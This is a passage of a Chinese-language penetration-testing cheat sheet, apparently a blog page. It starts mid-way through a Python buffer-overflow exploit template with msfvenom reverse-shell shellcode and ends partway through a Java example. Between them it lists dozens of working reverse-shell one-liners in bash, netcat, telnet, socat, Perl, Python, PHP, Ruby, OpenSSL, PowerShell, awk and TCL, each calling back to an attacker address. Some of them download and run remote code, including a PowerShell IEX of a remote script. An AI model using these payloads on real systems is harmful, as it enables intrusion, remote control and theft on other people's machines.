eip_offset</span><br><span class="line"></span><br><span class="line"># 获得jmp esp指令的地址</span><br><span class="line"># 使用命令“!mona modules ”获得程序加载模块信息</span><br><span class="line"># 找一个没有开启Rebase, SafeSEH, ASLR, NXCompat的模块dll</span><br><span class="line"># 使用命令“ !mona find -s '\xff\xe4' -m &lt;模块名&gt;”在模块中查找jmp esp的地址</span><br><span class="line"># 注意：要选择一个没有坏字符的地址</span><br><span class="line"># 将地址反写替换下面eip的值</span><br><span class="line"></span><br><span class="line">eip = <span class="string">"\x12\x34\x56\x78"</span></span><br><span class="line"></span><br><span class="line"># 在shellcode前填充nop指令，可提高兼容性</span><br><span class="line"></span><br><span class="line">nop = <span class="string">"\x90"</span> * <span class="number">20</span></span><br><span class="line"></span><br><span class="line"># 生成反弹Shellcode</span><br><span class="line"># 使用命令“msfvenom -p windows/shell_reverse_tcp lhost=&lt;本机IP&gt; lport=&lt;监听端口&gt; -b '\x00\x坏\x字\x符' -f python”</span><br><span class="line"># 将生成shellcode替换下面sc</span><br><span class="line"></span><br><span class="line">sc = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"># 组装payload  </span><br><span class="line"># payload   = [AAAAAA...AAA][EIP][NOP][Shellcode]</span><br><span class="line"></span><br><span class="line">payload = junk + eip + nop + sc</span><br><span class="line"></span><br><span class="line"># 发送到目标靶机的某个端口如 </span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">"&lt;靶机地址&gt;"</span>, &lt;端口&gt;))</span><br><span class="line"></span><br><span class="line">s.sendall(payload)</span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h1 id="rdesktop"><a href="#rdesktop" class="headerlink" title="rdesktop"></a>rdesktop</h1><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -u username -p password -g <span class="number">85</span>% -r disk:share=<span class="regexp">/root/</span> x.x.x.x</span><br></pre></td></tr></table></figure><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h3 id="1、Bash环境下反弹TCP协议shell"><a href="#1、Bash环境下反弹TCP协议shell" class="headerlink" title="1、Bash环境下反弹TCP协议shell"></a><strong>1、Bash环境下反弹TCP协议shell</strong></h3><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.11/443 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/10.10.10.11/443 0&lt;&amp; 2&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec /bin/sh 0&lt;/dev/tcp/10.10.10.11/443 1&gt;&amp;0 2&gt;&amp;0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.10.11/443; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><h2 id="2、Bash环境下反弹UDP协议shell"><a href="#2、Bash环境下反弹UDP协议shell" class="headerlink" title="2、Bash环境下反弹UDP协议shell:"></a><strong>2、Bash环境下反弹UDP协议shell:</strong></h2><p>首先在本地监听UDP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -u -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/udp/10.10.10.11/443 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="3、使用Netcat反弹shell"><a href="#3、使用Netcat反弹shell" class="headerlink" title="3、使用Netcat反弹shell"></a><strong>3、使用Netcat反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.10.10.11 443</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 10.10.10.11 443</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -c bash 10.10.10.11 443</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc 10.10.10.11 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.11 443 &gt;/tmp/f</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc 10.10.10.11 443 0/tmp/p 2&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.11 443 &gt; f</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f x; mknod x p &amp;&amp; nc 10.10.10.11 443 0&lt;x | /bin/bash 1&gt;x</span><br></pre></td></tr></table></figure><h2 id="4、使用Ncat反弹shell"><a href="#4、使用Ncat反弹shell" class="headerlink" title="4、使用Ncat反弹shell"></a><strong>4、使用Ncat反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat 10.10.10.11 443 -e /bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat --udp 10.10.10.11 443 -e /bin/bash</span><br></pre></td></tr></table></figure><h2 id="5、利用Telnet反弹shell"><a href="#5、利用Telnet反弹shell" class="headerlink" title="5、利用Telnet反弹shell"></a><strong>5、利用Telnet反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet 10.10.10.11 443 0/tmp/p 2&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.10.10.11 443 | /bin/bash | telnet 10.10.10.11 444</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet 10.10.10.11 443 &gt; f</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f x; mknod x p &amp;&amp; telnet 10.10.10.11 443 0&lt;x | /bin/bash 1&gt;x</span><br></pre></td></tr></table></figure><h2 id="6、使用Socat反弹shell"><a href="#6、使用Socat反弹shell" class="headerlink" title="6、使用Socat反弹shell"></a><strong>6、使用Socat反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:`tty`,raw,echo=0 TCP-L:443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-connect:10.10.10.11:443 exec:&quot;bash -li&quot;,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443</span><br></pre></td></tr></table></figure><h2 id="7、利用Perl脚本反弹"><a href="#7、利用Perl脚本反弹" class="headerlink" title="7、利用Perl脚本反弹"></a><strong>7、利用Perl脚本反弹</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.10.10.11&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.10.10.11:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</span><br></pre></td></tr></table></figure><p>win平台下执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &apos;$c=new IO::Socket::INET(PeerAddr,&quot;10.10.10.11:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</span><br></pre></td></tr></table></figure><h2 id="8、利用Python脚本反弹shell"><a href="#8、利用Python脚本反弹shell" class="headerlink" title="8、利用Python脚本反弹shell"></a><strong>8、利用Python脚本反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><p>IPv4协议如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export RHOST=&quot;10.10.10.11&quot;;export RPORT=443;python -c &apos;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.11&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure><p>IPv6协议如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::125c&quot;,443,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&quot;/bin/sh&quot;);&apos;</span><br></pre></td></tr></table></figure><p>Windows平台如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Python27\python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&apos;10.10.10.11&apos;, 443)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&apos;except&apos;, (), &#123;&apos;__enter__&apos;: lambda self: None, &apos;__exit__&apos;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])&#125;)(), type(&apos;try&apos;, (), &#123;&apos;__enter__&apos;: lambda self: None, &apos;__exit__&apos;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]&#125;)())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&apos;p2s_thread&apos;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&apos;s2p_thread&apos;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&apos;p&apos;] in [(subprocess.Popen([&apos;\\windows\\system32\\cmd.exe&apos;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&apos;s&apos;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&apos;p2s&apos;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&apos;s&apos;].send(__l[&apos;p&apos;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&apos;s&apos;], __l[&apos;p&apos;] in [(s, p)]][0])(&#123;&#125;), &apos;p2s&apos;)]][0] for __g[&apos;s2p&apos;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&apos;p&apos;].stdin.write(__l[&apos;data&apos;]), __after())[1] if (len(__l[&apos;data&apos;]) &gt; 0) else __after())(lambda: __this()) for __l[&apos;data&apos;] in [(__l[&apos;s&apos;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&apos;s&apos;], __l[&apos;p&apos;] in [(s, p)]][0])(&#123;&#125;), &apos;s2p&apos;)]][0] for __g[&apos;os&apos;] in [(__import__(&apos;os&apos;, __g, __g))]][0] for __g[&apos;socket&apos;] in [(__import__(&apos;socket&apos;, __g, __g))]][0] for __g[&apos;subprocess&apos;] in [(__import__(&apos;subprocess&apos;, __g, __g))]][0] for __g[&apos;threading&apos;] in [(__import__(&apos;threading&apos;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&apos;contextlib&apos;))&quot;</span><br></pre></td></tr></table></figure><h2 id="9、利用PHP脚本反弹shell"><a href="#9、利用PHP脚本反弹shell" class="headerlink" title="9、利用PHP脚本反弹shell"></a><strong>9、利用PHP脚本反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;10.10.10.11&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$s=fsockopen(&quot;10.10.10.11&quot;,443);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$s=fsockopen(&quot;10.10.10.11&quot;,443);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$s=fsockopen(&quot;10.10.10.11&quot;,443);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$s=fsockopen(&quot;10.10.10.11&quot;,443);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$s=fsockopen(&quot;10.10.10.11&quot;,443);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$s=\&apos;127.0.0.1\&apos;;$p=443;@error_reporting(0);@ini_set(&quot;error_log&quot;,NULL);@ini_set(&quot;log_errors&quot;,0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n))&#123;if($x=proc_open(\&apos;/bin/sh$IFS-i\&apos;,array(array(\&apos;pipe\&apos;,\&apos;r\&apos;),array(\&apos;pipe\&apos;,\&apos;w\&apos;),array(\&apos;pipe\&apos;,\&apos;w\&apos;)),$p,getcwd()))&#123;stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true)&#123;if(feof($s))die(\&apos;connection/closed\&apos;);if(feof($p[1]))die(\&apos;shell/not/response\&apos;);$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));&#125;fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);&#125;else&#123;die(&quot;proc_open/disabled&quot;);&#125;&#125;else&#123;die(&quot;not/connect&quot;);&#125;&apos;</span><br></pre></td></tr></table></figure><h2 id="10、利用Ruby脚本反弹shell"><a href="#10、利用Ruby脚本反弹shell" class="headerlink" title="10、利用Ruby脚本反弹shell"></a><strong>10、利用Ruby脚本反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.10.10.11&quot;,443).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;10.10.10.11&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</span><br></pre></td></tr></table></figure><p>Windows平台如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e &apos;c=TCPSocket.new(&quot;10.10.10.11&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&apos;</span><br></pre></td></tr></table></figure><h2 id="11、使用OpenSSL反弹shell"><a href="#11、使用OpenSSL反弹shell" class="headerlink" title="11、使用OpenSSL反弹shell"></a><strong>11、使用OpenSSL反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 443</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat --ssl -vv -l -p 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 10.10.10.11:443 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure><h2 id="12、win平台下使用Powershell反弹shell"><a href="#12、win平台下使用Powershell反弹shell" class="headerlink" title="12、win平台下使用Powershell反弹shell"></a><strong>12、win平台下使用Powershell反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(&quot;10.10.10.11&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&apos;10.10.10.11&apos;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&apos;)</span><br></pre></td></tr></table></figure><h2 id="13、利用Awk反弹shell"><a href="#13、利用Awk反弹shell" class="headerlink" title="13、利用Awk反弹shell"></a><strong>13、利用Awk反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;BEGIN &#123;s = &quot;/inet/tcp/0/10.10.10.11/443&quot;; while(42) &#123; do&#123; printf &quot;shell&gt;&quot; |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != &quot;exit&quot;) close(s); &#125;&#125;&apos; /dev/null</span><br></pre></td></tr></table></figure><h2 id="14、TCL脚本反弹shell"><a href="#14、TCL脚本反弹shell" class="headerlink" title="14、TCL脚本反弹shell"></a><strong>14、TCL脚本反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;set s [socket 10.10.10.11 443];while 42 &#123; puts -nonewline $s &quot;shell&gt;&quot;;flush $s;gets $s c;set e &quot;exec $c&quot;;if &#123;![catch &#123;set r [eval $e]&#125; err]&#125; &#123; puts $s $r &#125;; flush $s; &#125;; close $s;&apos; | tclsh</span><br></pre></td></tr></table></figure><h2 id="15、Java版本反弹shell"><a href="#15、Java版本反弹shell" class="headerlink" title="15、Java版本反弹shell"></a><strong>15、Java版本反弹shell</strong></h2><p>首先在本地监听TCP协议443端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>然后在靶机上执行如下命令：</p><p>linux平台：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.10.10.11/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><p>windows平台：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String host=&quot;127.0.0.1&quot;;</span><br><span class="line">int port=4444;</span><br><span class="line">String cmd=&quot;cmd.exe&quot;;</span><br><span class="line">Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream 